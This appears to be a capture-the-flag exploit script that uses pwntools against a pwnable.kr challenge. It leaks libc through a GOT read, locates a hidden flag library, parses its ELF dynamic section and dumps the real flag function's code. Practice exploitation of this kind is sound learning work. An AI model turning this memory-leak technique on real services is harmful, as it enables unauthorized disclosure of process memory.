from pwn import *
import struct

# sudo docker cp elf:/usr/bin/python2.7 python2.7
elf = context.binary = ELF("./python2.7") 
# sudo docker cp elf:/lib/x86_64-linux-gnu/libc-2.23.so libc.so
libc = ELF("./libc.so")

#r = remote("0.0.0.0",9024)
r = remote("pwnable.kr",9024)

# Find libc base address
r.sendlineafter(b"addr?:", hex(elf.got['__libc_start_main']).encode())
leak = int(u64(r.recv(8)))
libc.address = leak - libc.sym['__libc_start_main']
r.info(f"LIBC base address: {hex(libc.address)}")

# Calculate libflag base address
#libflag_base = libc.address - 0x177d000                   # (local)
libflag_base = libc.address -  0x1690000 + 0x1000          # (remote)
r.info(f"libflag.so base address: {hex(libflag_base)}")

"""
# Bruteforce
for i in range(25):
    libflag_base = libc.address - 0x1682000
    libflag_base -= i*0x1000
    r.sendline(hex(libflag_base).encode())
    l = r.recvuntil(b"addr?")
    if b"ELF" in l:
        print("JACKPOT")
        r.info(hex(libc.address - libflag_base))
        r.info(hex(libflag_base))
        print(l)
        print(i)
        break
#exit(1)
"""
# Find .dynamic segment
r.sendlineafter(b"addr?:", hex(libflag_base + 0x40 + 0x38*2).encode())
data = r.recv(32)
r.sendlineafter(b"addr?:", hex(libflag_base + 0x40 + 0x38*2 + 32).encode())
data += r.recv(24)
p_type, p_flags, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align = struct.unpack("<IIQQQQQQ", data)
r.info(".dynamic")
print(f"p_type: {hex(p_type)}")
print(f"p_flags: {hex(p_flags)}")
print(f"p_offset: {hex(p_offset)}")
print(f"p_vaddr: {hex(p_vaddr)}")
print(f"p_paddr: {hex(p_paddr)}")
print(f"p_filesz: {hex(p_filesz)}")
print(f"p_memsz: {hex(p_memsz)}")
print(f"p_align: {hex(p_align)}")

# Find STRTAB
r.sendlineafter(b"addr?:", hex(libflag_base + p_vaddr + 16*8).encode())
data = r.recv(16)
strtab_d_tag, strtab_d_val = struct.unpack("<QQ",data)
r.info("STRTAB")
print(f"d_tag: {hex(strtab_d_tag)}")
print(f"d_val: {hex(strtab_d_val)}")

# Find STRSZ
r.sendlineafter(b"addr?:", hex(libflag_base + p_vaddr + 16*10).encode())
data = r.recv(16)
strsz_d_tag, strsz_d_val = struct.unpack("<QQ",data)
r.info("STRSZ")
print(f"d_tag: {hex(strsz_d_tag)}")
print(f"d_val: {hex(strsz_d_val)}")

# Find number of 'not_ur_flag' functions
r.sendlineafter(b"addr?:", hex(strtab_d_val + strsz_d_val - 0x48).encode())
r.recvuntil(b"flag"); n = int(r.recvuntil(b"libc")[:-5])

r.info(f"Number of 'not_ur_flag' symbols: {n}")

# Find _fini address
r.sendlineafter(b"addr?:", hex(libflag_base + p_vaddr + 16*2).encode())
data = r.recv(16)
FINI_d_tag, FINI_d_val = struct.unpack("<QQ",data)
r.info("DTFINI")
print(f"d_tag: {hex(FINI_d_tag)}")
print(f"d_val: {hex(FINI_d_val)}")

# Leak 'yes_ur_flag'

leak = b""
for i in range(25-7):
    # 'not_ur_flag' functions are 19 bytes long each
    addr = libflag_base + FINI_d_val - n*19 - i*32
    r.sendline(hex(addr).encode())
    l = r.recvuntil(b"addr?")
    leak += l
    print(l)

open("code","wb").write(leak)
# ELF64 structs
"""
typedef struct {
    uint32_t p_type;    /* Tipo de segmento (PT_LOAD, PT_DYNAMIC, etc.) */
    uint32_t p_flags;   /* Flags de acceso (R/W/X) */
    uint64_t p_offset;  /* Offset en el archivo */
    uint64_t p_vaddr;   /* Dirección virtual en memoria */
    uint64_t p_paddr;   /* Dirección física (no usado en userland) */
    uint64_t p_filesz;  /* Tamaño en el archivo */
    uint64_t p_memsz;   /* Tamaño en memoria */
    uint64_t p_align;   /* Alineación */
} Elf64_Phdr;

typedef struct {
    Elf64_Sxword 	d_tag
    union { 	
        Elf64_Xword   d_val 	
        Elf64_Addr   d_ptr 	
    } d_un
} Elf64_Dyn
"""
